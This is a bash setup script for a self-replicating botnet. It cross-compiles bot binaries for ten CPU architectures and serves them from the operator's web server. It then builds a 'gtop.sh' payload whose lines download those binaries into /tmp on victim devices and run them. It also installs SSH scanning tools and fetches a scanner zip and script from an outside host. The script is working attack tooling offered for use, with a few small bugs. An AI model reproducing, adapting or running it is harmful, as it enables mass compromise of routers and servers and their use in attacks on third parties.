#!/bin/bash

echo "###############################################################################"
echo "# ___     __________  ____ _______      _____ _______________.___.  ___       #"
echo "# / _ \_/\ \______   \/_   |\      \    /  _  \\______   \__  |   | / _ \_/\  #"
echo "# \/ \___/  |    |  _/ |   |/   |   \  /  /_\  \|       _//   |   | \/ \___/  #"
echo "#           |    |   \ |   /    |    \/    |    \    |   \\____   |           #"
echo "#           |______  / |___\____|__  /\____|__  /____|_  // ______|           #"
echo "#                  \/              \/         \/       \/ \/                  #"
echo "###############################################################################"

#########################################
###############Botnames##################
#########################################
L1='jackmymipsel' #mipsel
L2='jackmymips'  #mips
L3='jackmysh4'    #sh4
L4='jackmyx86' #x86_64
L5='jackmyarmv6' #armv6l
L6='jackmyi686'   #i686
L7='jackmypowerpc'  #powerpc
L8='jackmyi586'  #i586
L9='jackmym68k'  #m68k
L10='jackmysparc'  #sparc

#########################################
##############Wgetlinks##################
#########################################
mips='http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mips.tar.bz2'
mipsel='http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mipsel.tar.bz2'
sh4='http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-sh4.tar.bz2'
x86_64='http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-x86_64.tar.bz2'
armv6l='http://distro.ibiblio.org/slitaz/sources/packages/c/cross-compiler-armv6l.tar.bz2'
i686='http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-i686.tar.bz2'
ppc='http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-powerpc.tar.bz2'
i586='http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-i586.tar.bz2'
m68k='http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-m68k.tar.bz2'
sparc='http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-sparc.tar.bz2'
if [ $# != 1 ]; then
echo "Usage: sh NSA-editv2.sh <file to compile> if not executed like this, it will not fucking work."
exit 0
fi
sleep 5
echo "\e[0;31myou have 5 seconds to cancel this if you fucked up"
#########################################
################MISC#####################
#########################################
cd /root
apt-get install tar -q
yum install tar -y -q
yum install bzip -y || yum install bzip2 -y
#########################################
################WGETS#################
#########################################
echo "\e[0;31mWgetting cross-compilers be paitent."
if [ -d cross-compiler-mips ]
then
echo -e "\e[0;31mcross-compiler-mips is present, no need for wget"
else
wget --quiet $mips
tar -xvjf cross-compiler-mips*
fi
if [ -d cross-compiler-mipsel ]
then
echo -e "\e[0;31mcross-compiler-mipsel is present, no need for wget"
else
wget --quiet $mipsel
tar -xvjf cross-compiler-mipsel*
fi
if [ -d cross-compiler-sh4 ]
then
echo -e "\e[0;31mcross-compiler-sh4 is present, no need for wget"
else
wget --quiet $sh4
tar -xvjf cross-compiler-sh4*
fi
if [ -d cross-compiler-x86_64 ]
then
echo -e "\e[0;31mcross-compiler-x86_64 is present, no need for wget"
else
wget --quiet $x86_64
tar -xvjf cross-compiler-x86_64*
fi
if [ -d cross-compiler-armv6l ]
then
echo -e "\e[0;31mcross-compiler-armv6l is present, no need for wget"
else
wget --quiet $armv6l
tar -xvjf cross-compiler-armv6l*
fi
if [ -d cross-compiler-powerpc ]
then
echo -e "\e[0;31mcross-compiler-powerpc is present, no need for wget"
else
wget --quiet $ppc
tar -xvjf cross-compiler-powerpc*
fi
if [ -d cross-compiler-m68k ]
then
echo -e "\e[0;31mcross-compiler-m68k is present, no need for wget"
else
wget --quiet $m68k
tar -xvjf cross-compiler-m68k*
fi
if [ -d cross-compiler-sparc ]
then
echo -e "\e[0;31mcross-compiler-sparc is present, no need for wget"
else
wget --quiet $sparc
tar -xvjf cross-compiler-sparc*
fi
if [ -d cross-compiler-i586 ]
then
echo -e "\e[0;31mcross-compiler-i586 is present, no need for wget"
else
wget --quiet $i586
tar -xvjf cross-compiler-i586*
fi
if [ -d cross-compiler-i686 ]
then
echo -e "\e[0;31mcross-compiler-i686 is present, no need for wget"
else
wget --quiet $i686
tar -xvjf cross-compiler-i686*
fi
rm -rf *.tar.bz2
echo -e "\e[0;31mDone."
sleep 3

#########################################
##############Compiling##################
#########################################
./cross-compiler-mipsel/bin/mipsel-gcc -static -lpthread -pthread -DMIPSEL -o $L1 $1 > /dev/null 2>&1
./cross-compiler-mips/bin/mips-gcc -static -lpthread -pthread -Dmips -o $L2 $1 > /dev/null 2>&1
./cross-compiler-sh4/bin/sh4-gcc -static -lpthread -pthread -Dsh4 -o $L3 $1 > /dev/null 2>&1
./cross-compiler-x86_64/bin/x86_64-gcc -static -lpthread -pthread -Dx86_64 -o $L4 $1 > /dev/null 2>&1
./cross-compiler-armv6l/bin/armv6l-gcc -static -lpthread -pthread -Darmv6l -o $L5 $1 > /dev/null 2>&1
./cross-compiler-i686/bin/i686-gcc -static -lpthread -pthread -Di686 -o $L6 $1 > /dev/null 2>&1
./cross-compiler-powerpc/bin/powerpc-gcc -static -lpthread -pthread -Dpowerpc -o $L7 $1 > /dev/null 2>&1
./cross-compiler-i586/bin/i586-gcc -static -lpthread -pthread -Di586 -o $L8 $1 > /dev/null 2>&1
./cross-compiler-m86k/bin/m86k-gcc -static -lpthread -pthread -Dm86k -o $L9 $1 > /dev/null 2>&1
./cross-compiler-sparc/bin/sparc-gcc -static -lpthread -pthread -Dsparc -o $L10 $1 > /dev/null 2>&1
echo -e "\e[0;31mDone compiling binarys, stripped and bytes reduced."
mv jackmy* /var/www/html/

######################################
##############/'d'####################
######################################
echo -e "\e[0;31mIf you do not have apache/a webserver setup, cancel this and install it."
echo -e "\e[0;31mThis was removed because it's annoying to install it through bash, do it yourself."

#########################################
############Setting up gtop.sh###########
#########################################
echo -e "\e[0;31mTouching gtop.sh"
rm -rf gtop.sh
cd /var/www/html/; touch gtop.sh
echo -e "\e[0;31mCreating Payload now."
echo -e "\e[0;31mThis will take a few, be patient.."
sleep 2
echo "cd /tmp && wget -q http://$(curl -s checkip.dyndns.org | sed -e 's/.*Current IP Address: //' -e 's/<.*$//')/$L1 && chmod +x $L1 && ./$L1">> gtop.sh
echo "cd /tmp && wget -q http://$(curl -s checkip.dyndns.org | sed -e 's/.*Current IP Address: //' -e 's/<.*$//')/$L2 && chmod +x $L2 && ./$L2">> gtop.sh
echo "cd /tmp && wget -q http://$(curl -s checkip.dyndns.org | sed -e 's/.*Current IP Address: //' -e 's/<.*$//')/$L3 && chmod +x $L3 && ./$L3">> gtop.sh
echo "cd /tmp && wget -q http://$(curl -s checkip.dyndns.org | sed -e 's/.*Current IP Address: //' -e 's/<.*$//')/$L4 && chmod +x $L4 && ./$L4">> gtop.sh
echo "cd /tmp && wget -q http://$(curl -s checkip.dyndns.org | sed -e 's/.*Current IP Address: //' -e 's/<.*$//')/$L5 && chmod +x $L5 && ./$L5">> gtop.sh
echo "cd /tmp && wget -q http://$(curl -s checkip.dyndns.org | sed -e 's/.*Current IP Address: //' -e 's/<.*$//')/$L6 && chmod +x $L6 && ./$L6">> gtop.sh
echo "cd /tmp && wget -q http://$(curl -s checkip.dyndns.org | sed -e 's/.*Current IP Address: //' -e 's/<.*$//')/$L7 && chmod +x $L7 && ./$L7">> gtop.sh
echo "cd /tmp && wget -q http://$(curl -s checkip.dyndns.org | sed -e 's/.*Current IP Address: //' -e 's/<.*$//')/$L8 && chmod +x $L8 && ./$L8">> gtop.sh
echo "cd /tmp && wget -q http://$(curl -s checkip.dyndns.org | sed -e 's/.*Current IP Address: //' -e 's/<.*$//')/$L9 && chmod +x $L9 && ./$L9">> gtop.sh
echo "cd /tmp && wget -q http://$(curl -s checkip.dyndns.org | sed -e 's/.*Current IP Address: //' -e 's/<.*$//')/$L10 && chmod +x $L10 && ./$L10">> gtop.sh
#########################################
###############ULIMIT#####################
#########################################
cd /root
ulimit -u 999999;ulimit -n 999999
echo "#.bashrc">> .bashrc
echo "#ulimit set">> .bashrc
echo "ulimit -u 999999">> .bashrc
echo "ulimit -n 999999">> .bashrc
bash
#########################################
###############WGETS#####################
#########################################
$wgetLRAB='http://b.1339.cf/pbehfwe.zip'
$wgetscan='http://b.1339.cf/xhuudjm.py'

#########################################
######Installing mods for scanning#######
#########################################
echo -e "\e[0;31mInstalling Dependencies For Scanning"
sleep 3
echo -e "\e[0;31mFinishing up install...."
yum install cpan wget curl glibc.i686 -y
cpan force install Parallel::ForkManager
cpan force install IO::Socket
cpan force install IO::Select
sleep 2
yum install gcc php-devel php-pear libssh2 libssh2-devel
pecl install -f ssh2
touch /etc/php.d/ssh2.ini
echo extension=ssh2.so > /etc/php.d/ssh2.ini
cpan force install Net::SSH2
yum install python-paramiko

#########################################
################LRAB#####################
#########################################
echo -e "\e[0;31mScanner can be found in /root/scan"
sleep 2
mkdir /root/scan/
cd /root/scan/
wget --quiet $wgetLRAB -O LRAB.zip; unzip LRAB.zip; wget --quiet $wgetscan -O scan.py;

echo "I Got To Give Some Thanks To ShAy sense it was based off of NSA.sh"
echo "Done, Now Finish Your Self Replicating Flame Botnet"
